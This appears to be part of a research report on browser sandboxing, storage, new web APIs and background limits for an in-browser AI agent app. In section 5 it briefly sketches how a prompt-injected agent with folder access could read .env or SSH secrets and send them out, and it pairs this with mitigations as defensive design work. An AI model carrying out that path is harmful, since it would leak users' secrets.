- A SW cannot mint a new origin. Only a different host name can. The cheapest strong option is a second static site on a different registrable domain (a separate GitHub org/user's `*.github.io`, or `*.pages.dev`/`*.netlify.app` where real headers are available) hosting only a static sandbox-proxy page, mirroring MCP Apps: `Host -> <iframe src="https://beamhop-sandbox.pages.dev/proxy.html" sandbox="allow-scripts allow-same-origin"> -> inner opaque frame with generated code`. This gets cross-site process isolation in Chromium/Firefox desktop and a header CSP + `frame-ancestors` pinning to the Beamhop origin. Cost: a second deploy target and a supply-chain dependency on that host.
- Same-user Pages hazard: any other repo published under the same `user.github.io` (now or later, including forks with Pages enabled under that account) is same-origin with Beamhop and can read its IndexedDB. Mitigations: dedicated GitHub org/user for Beamhop, or a custom domain. This is independent of agent sandboxing but dominates the threat model if ignored.
- Per-agent or per-room unique origins (the Claude/ChatGPT per-UUID subdomain model) require wildcard DNS and are not achievable on github.io; opaque origins are the substitute (each sandboxed frame gets its own unique opaque origin).

### Gaps
- No primary source fetched confirming that service-worker-synthesized `Content-Security-Policy: sandbox` headers are honored identically in Safari and Firefox; the mechanism is standard but should be tested.
- Whether GitHub Pages will ever allow custom headers: no evidence of change found; not specifically searched.
- Safari was not covered by the meta-CSP tamper-resistance testing.

---

## 5. Storage partitioning, quotas, OPFS, File System Access

### Takeaway
An opaque-origin sandbox has no persistent storage at all, so the host must broker files; OPFS is the cross-browser substrate for an agent workspace (with sync access handles only in dedicated workers), while working on a real local folder via `showDirectoryPicker` remains Chromium-only with Firefox negative and Apple opposed.

### Cited Findings
- [V] `showDirectoryPicker`: Chrome/Edge since 86, and caniuse lists Chrome for Android as supporting it as of v155; Firefox unsupported through 161 with Mozilla's standards position negative; Safari unsupported through 27.2 with Apple's position opposed citing security. Fallback: `<input type="file" webkitdirectory>` (read-only snapshot) works in Firefox and Safari. — [caniuse](https://caniuse.com/mdn-api_window_showdirectorypicker), [web-features explorer](https://web-platform-dx.github.io/web-features-explorer/features/file-system-access), [web.dev open a directory](https://web.dev/patterns/files/open-a-directory), [Mozilla bug 1909237](https://bugzilla.mozilla.org/show_bug.cgi?id=1909237)
- [V] Opaque-origin (sandboxed without allow-same-origin) documents are potentially prevented from accessing data storage/cookies and some JS APIs. — [MDN iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)
- [V] `credentialless` iframes get a new ephemeral storage context scoped to the top-level document lifetime. — [MDN iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)
- [BK] OPFS (`navigator.storage.getDirectory()`) is available in Chrome, Firefox and Safari; `FileSystemFileHandle.createSyncAccessHandle()` is only available in dedicated Web Workers and gives synchronous in-place read/write (what SQLite-wasm and similar use). — [MDN OPFS](https://developer.mozilla.org/en-US/docs/Web/API/File_System_API/Origin_private_file_system)
- [BK] Quotas: Chromium allows an origin up to ~60% of total disk; Firefox best-effort is the smaller of 10% of disk or 10 GiB per eTLD+1 group (persistent: up to 50%, max 8 TiB); Safari 17+ allows roughly 60% of disk for browser-opened origins, with cross-origin frames limited to about one tenth of that; `navigator.storage.estimate()` reports usage/quota. — [MDN Storage quotas and eviction criteria](https://developer.mozilla.org/en-US/docs/Web/API/Storage_API/Storage_quotas_and_eviction_criteria)
- [BK] `navigator.storage.persist()`: Chromium auto-grants/denies by heuristic (installed PWA, engagement, notification permission) with no prompt; Firefox shows a prompt; Safari grants by heuristic. Safari deletes script-writable storage of origins without user interaction for 7 days of browser use; installed home-screen web apps are exempt. — [MDN Storage quotas and eviction criteria](https://developer.mozilla.org/en-US/docs/Web/API/Storage_API/Storage_quotas_and_eviction_criteria), [WebKit: Updates to Storage Policy](https://webkit.org/blog/14403/updates-to-storage-policy/)
- [BK] Storage partitioning: storage in third-party (cross-site) iframes is keyed by (top-level site, frame origin) in Chrome (115+), Firefox and Safari. — [Privacy Sandbox storage partitioning](https://privacysandbox.google.com/cookies/storage-partitioning)
- [BK] Storage Buckets API (`navigator.storageBuckets`) lets an origin create multiple buckets with separate quota/persistence/eviction; Chromium-only (122+). — [MDN Storage Buckets / Chrome docs](https://developer.chrome.com/docs/web-platform/storage-buckets)
- [BK] File System Access permission persistence: Chromium offers "allow on every visit" persistent permissions for handles stored in IndexedDB (Chrome 122+); otherwise the user re-grants per session via `handle.requestPermission()`. — [Chrome persistent permissions](https://developer.chrome.com/blog/persistent-permissions-for-the-file-system-access-api)

### Inferences
- Design consequence: the agent sandbox should see a *virtual* filesystem served over postMessage by the host (backed by an OPFS subdirectory per agent/room, or by a user-picked real directory handle on Chromium). The sandbox never holds a `FileSystemDirectoryHandle`; handles are structured-cloneable only to same-origin contexts anyway, which an opaque frame is not.
- A real directory handle is a high-value capability: under prompt injection, an agent with read-write access to a local folder can read secrets in it (`.env`, SSH configs if the user picks a broad folder) and then exfiltrate through any allowed egress tool. Scope picks to a project folder, default to read-only (`mode: 'read'`), and gate writes.
- If the sandbox is on a second real origin (option 4c) with `allow-same-origin`, it gets its own partitioned storage keyed under the Beamhop top-level site: convenient for caches (e.g. Pyodide packages), but shared across all agents using that origin, so do not put per-agent secrets there.
- Safari's 7-day eviction makes key material in IndexedDB fragile for non-installed iOS users; PWA install plus `persist()` is the mitigation, and it reinforces the need for key export/backup.
- OPFS sync access handles being worker-only pushes toward the "sandbox iframe -> worker" or "host worker as FS broker" architecture.

### Gaps
- Exact current Safari quota numbers and whether Safari changed opaque/partitioned storage rules in 2026: not re-verified.
- Whether Chrome for Android's `showDirectoryPicker` support (per caniuse v155) is fully functional for arbitrary local folders: only the caniuse listing was seen; needs device testing.
- Storage Buckets status in Firefox/Safari not re-verified (believed unsupported).

---

## 6. Emerging powerful no-install APIs

### Takeaway
Chromium desktop is far ahead: Prompt API (Gemini Nano) went stable for web pages in Chrome 148 (May 2026, desktop only), WebMCP is in origin trial (Chrome 149–156, ship target 157), and File System Access/WebUSB/WebSerial remain Chromium-only, while Direct Sockets is locked to enterprise Isolated Web Apps. Chrome's Local Network Access permission (since 142) now gates public-page calls to localhost, which directly affects any "talk to a local model/MCP server" feature.

### Cited Findings

**Built-in AI / Prompt API**
- [V] "Prompt API is stable: Chrome 148 uses Gemini Nano with multimodal inputs and structured output." Available from Chrome 148 on desktop: Windows, macOS, Linux, Chromebook Plus. Not supported: Chrome for Android, iOS, and non-Chromebook-Plus ChromeOS. — [Chrome at I/O 2026](https://developer.chrome.com/blog/chrome-at-io26), [Prompt API docs](https://developer.chrome.com/docs/ai/prompt-api), [Intent to Ship](https://groups.google.com/a/chromium.org/g/blink-dev/c/iR6R7-nQeHI)
- [V] The model is downloaded on first use by an origin, and requires at least 22 GB free on the Chrome profile volume; sampling parameters are not exposed to the web by default (a web sampling mode was in origin trial); WPT coverage incomplete per the April 2026 intent thread. — [Prompt API docs](https://developer.chrome.com/docs/ai/prompt-api), [Intent to Ship](https://groups.google.com/a/chromium.org/g/blink-dev/c/iR6R7-nQeHI)

**WebMCP (`navigator.modelContext`)**
- [V] Intent to Experiment posted 15 May 2026, approved 18 May 2026 for an origin trial M149–M156 (desktop); dev trial from 146; shipping target desktop 157; spec in incubation, TAG review to be requested before shipping. It lets pages expose agent-specific tools, including a declarative variant via form attributes; a DevTools Protocol WebMCP domain lists/invokes tools and logs agent calls; the intent flags prompt injection and data exposure risks. — [blink-dev Intent to Experiment: WebMCP](https://groups.google.com/a/chromium.org/g/blink-dev/c/gmYffo5WOE8)

**Local Network Access**
- [V] Chrome 142 (desktop, late Oct 2025) shipped the Local Network Access permission prompt: requests from a public origin to localhost or private IPs require explicit user consent, including `fetch()`; local-to-local is unaffected. Chrome 145 split it into more granular permissions (separate `local-network` vs loopback). — [Chrome blog](https://developer.chrome.com/blog/local-network-access), [Intent to Ship](https://groups.google.com/a/chromium.org/g/blink-dev/c/cwu_RUmBpzY), [OpenReplay explainer](https://blog.openreplay.com/chrome-local-network-access-lna-permission/)
- [V] A Box support article states prompts appear "with the release of Google Chrome 142, Microsoft Edge 143 and Firefox" — the Firefox part is uncorroborated by a Mozilla source. — [Box support](https://support.box.com/hc/en-us/articles/45163820905107-Allow-Box-domains-local-network-access-in-Chrome-and-Edge-to-avoid-Box-Tools-disruption)

**Direct Sockets / Isolated Web Apps**
- [V] Direct Sockets (TCP/UDP) is only exposed in Isolated Web Apps with a `direct-sockets` permission-policy key plus cross-origin isolation; as of June 2026 "Isolated Web Apps are in enterprise-only mode presently"; the June 2026 PSA replaces `direct-sockets-private` with `local-network`/`loopback-network` policies. Earlier intent said only ChromeOS supported IWAs. — [Chrome IWA Direct Sockets docs](https://developer.chrome.com/docs/iwa/direct-sockets), [blink-dev PSA](https://groups.google.com/a/chromium.org/g/blink-dev/c/5cSZjgnJelk), [Intent to Ship](https://groups.google.com/a/chromium.org/g/blink-dev/c/5R0P_aYBWQI)

**WebGPU, in-browser inference, and other APIs (background knowledge)**
- [BK] WebGPU: Chrome 113+ desktop and 121+ Android; Safari 26 (Sept 2025) on macOS/iOS/iPadOS/visionOS; Firefox 141+ on Windows with other platforms following. — [MDN WebGPU API](https://developer.mozilla.org/en-US/docs/Web/API/WebGPU_API), [WebKit Safari 26 features](https://webkit.org/blog/16993/news-from-wwdc25-web-technology-coming-this-fall-in-safari-26-beta/)
- [BK] WebLLM runs LLMs fully in-browser on WebGPU with an OpenAI-compatible API and worker/service-worker engines; transformers.js v3+ supports a WebGPU backend. — [mlc-ai/web-llm](https://github.com/mlc-ai/web-llm), [transformers.js](https://huggingface.co/docs/transformers.js/index)
- [BK] WebUSB, Web Serial, WebHID: Chromium only; Apple and (historically) Mozilla declined. — [MDN WebUSB API](https://developer.mozilla.org/en-US/docs/Web/API/WebUSB_API), [MDN Web Serial API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Serial_API)
- [BK] WebTransport: Chrome 97+, Firefox 114+. WebCodecs: Chrome 94+, Safari 16.4+ (video; audio later), Firefox 130+ desktop. Document Picture-in-Picture: Chromium desktop 116+ only. `getDisplayMedia`: desktop Chrome/Firefox/Safari; not available on iOS or Android browsers. — [MDN WebTransport](https://developer.mozilla.org/en-US/docs/Web/API/WebTransport), [MDN WebCodecs](https://developer.mozilla.org/en-US/docs/Web/API/WebCodecs_API), [MDN Document PiP](https://developer.mozilla.org/en-US/docs/Web/API/Document_Picture-in-Picture_API), [MDN getDisplayMedia](https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getDisplayMedia)

### Inferences
- A fully local, zero-credential agent is feasible on Chromium desktop (Prompt API) and on WebGPU-capable browsers (WebLLM): this removes the provider-token asset from the threat model for those agents, though Nano-class models are more injection-prone and weaker at tool use. The 22 GB free-space requirement and desktop-only scope make Prompt API an opportunistic enhancement, not a baseline.
- All powerful APIs are permission-policy-gated and default to `self`: an opaque-origin sandbox gets none of WebGPU-adjacent device permissions, camera, mic, display capture, USB, serial, or (very likely) local-network access unless the host delegates via `allow=`. That is the desired default; the host should perform such operations and pass results in.
- LNA changes the "bring your own local model / local MCP server" story: a github.io page calling `http://localhost:11434` now triggers a Chrome permission prompt (and needs the local server to send CORS headers). It also reduces the blast radius of injected code probing the user's LAN, but only in Chrome/Edge; with `connect-src 'none'` in the sandbox this is moot for sandboxed code.
- WebMCP is relevant in the reverse direction: Beamhop could expose its own tools (send message, list rooms) to a *browser-level* agent. That is a new inbound attack surface, and during 2026 it is Chromium-desktop origin-trial only (trial tokens are per-origin, obtainable for a github.io origin).
- Direct Sockets/IWA is not a zero-install path (enterprise-only), so in-browser agents cannot open raw TCP (no native Nostr-over-TCP, SSH, or stdio MCP); WebSocket/WebTransport/HTTP only.
- Screen-sharing agents (`getDisplayMedia`) are desktop-only and require a user gesture and picker each time; captured frames may contain other apps' secrets, so treat them like plaintext room data with respect to what the sandbox/LLM provider sees.

### Gaps
- WebNN status (I recall Chromium origin trial in 2025–2026; shipping state as of Nov 2026 not verified).
- Firefox WebGPU coverage on macOS/Linux/Android and whether Firefox shipped Web Serial in 2026: not verified.
- Safari WebTransport support (I recall it arriving in the Safari 26.x line) not verified.
- Whether WebMCP actually shipped in Chrome 157 on schedule (around late 2026) was not confirmed; only the May 2026 plan was found.
- Firefox and Safari Local Network Access behavior: no reliable source found.
- Whether Chrome's LNA permission can be delegated to, or is blocked in, opaque-origin sandboxed iframes: not verified.
- Chrome's other built-in AI task APIs (Summarizer, Translator, Writer/Rewriter, Proofreader) not researched.

---

## 7. Background execution limits

### Takeaway
A browser tab is not a reliable host for a long-running agent: Chrome throttles hidden-tab timers progressively (1/s, then budget-based after 10 s, then once per minute after about 5 minutes hidden) with exemptions for audio and live WebSocket/WebRTC connections, and mobile OSes suspend pages outright. PWA install helps with storage persistence and push wake-ups but does not grant continuous background execution.

### Cited Findings
- [V] Chrome background timers: capped to about once per second since Chrome 11 (batched); budget-based throttling since Chrome 57 kicks in after a tab is backgrounded for 10 seconds; "Any tabs playing audio or containing real-time connections (like WebRTC and WebSockets) are not throttled." — [Chrome: Background tabs in Chrome 57](https://developer.chrome.com/blog/background_tabs), [Chromium blog 2017](https://blog.chromium.org/2017/03/reducing-power-consumption-for.html)
- [V] Intensive throttling: "Beginning in M87, Chrome is throttling JavaScript timer wake-ups in background tabs to once per minute", applied to pages hidden for about 5 minutes. Stated long-term direction: background tabs fully suspended, with background work moved to service-worker APIs. — [Chromium blog Nov 2020](https://blog.chromium.org/2020/11/tab-throttling-and-more-performance.html), [Intent to Ship: Expensive Background Timer Throttling](https://groups.google.com/a/chromium.org/g/blink-dev/c/XRqy8mIOWps)
- [BK] Intensive throttling applies only to chained timers on pages hidden >5 min, silent >30 s, with no WebRTC in use; pages may also be frozen or discarded by the Page Lifecycle machinery, and pages holding Web Locks or open IndexedDB transactions/connections are among those Chrome avoids freezing. — [Chrome: Heavy throttling of chained JS timers (Chrome 88)](https://developer.chrome.com/blog/timer-throttling-in-chrome-88), [Page Lifecycle API](https://developer.chrome.com/docs/web-platform/page-lifecycle-api)
- [BK] Service workers are event-driven and terminated when idle (Chrome: about 30 s idle, max about 5 min per event; `waitUntil` extends within limits); they cannot run an agent loop continuously. Background Sync / Periodic Background Sync / Background Fetch are Chromium-only, and periodic sync requires an installed PWA and is rate-limited by site engagement. — [Chrome: service worker lifecycle (extensions doc with timings)](https://developer.chrome.com/docs/extensions/develop/concepts/service-workers/lifecycle), [MDN Periodic Background Sync](https://developer.mozilla.org/en-US/docs/Web/API/Web_Periodic_Background_Synchronization_API)
- [BK] Web Locks API (all major browsers) coordinates a single active agent runner across tabs/workers of an origin (leader election). Screen Wake Lock API (Chrome 84+, Safari 16.4+, Firefox 126+) keeps the screen on while the page is visible. — [MDN Web Locks](https://developer.mozilla.org/en-US/docs/Web/API/Web_Locks_API), [MDN Screen Wake Lock](https://developer.mozilla.org/en-US/docs/Web/API/Screen_Wake_Lock_API)
- [BK] iOS/iPadOS: Web Push for home-screen-installed web apps since 16.4; no Background Sync; pages and their workers are suspended shortly after the app/tab is backgrounded. — [WebKit: Web Push for Web Apps on iOS and iPadOS](https://webkit.org/blog/13878/web-push-for-web-apps-on-ios-and-ipados/)

### Inferences
- Practical keep-alive stack on desktop Chromium/Firefox: run the agent loop in a dedicated worker (or the sandbox's worker), driven by network/message events rather than timers; keep the Nostr relay WebSocket open (exempts from intensive throttling in Chrome and delivers wake-ups); hold a Web Lock for single-runner election and to discourage freezing. None of this prevents tab discard under memory pressure or Energy Saver, so agent state must be checkpointed (OPFS/IndexedDB) and resumable.
- On mobile (iOS especially) assume the agent stops within seconds of backgrounding. "Agent in the browser" therefore means "agent runs while its owner's tab is foreground"; in a group chat, other members will see that agent go offline. Product implications: presence indicators for agents, resumable turns, or optional non-browser hosts for always-on agents (outside this zero-install scope).
- Web Locks also matter for correctness and safety: two tabs of the same user must not both run the same agent and double-execute tool calls or double-spend provider tokens.
- Sandboxed cross-origin iframes are throttled along with (or more aggressively than) their parent tab; putting the agent loop in the sandbox does not escape throttling.
- PWA install benefits: storage persistence heuristics (Chrome), exemption from Safari's 7-day eviction, Web Push on iOS, periodic background sync on Chromium. It does not provide continuous CPU.

### Gaps
- Chrome's newer Energy Saver "freeze CPU-intensive background tabs" behavior and its exact 2026 exemption list: not verified.
- Safari and Firefox background timer throttling specifics (both throttle to >= 1 s; details not sourced).
- Whether dedicated-worker timers remain less throttled than main-thread timers in current Chrome: not verified.
- No 2026 source found documenting any new web API for long-running background agent execution; I am not aware of one shipping.
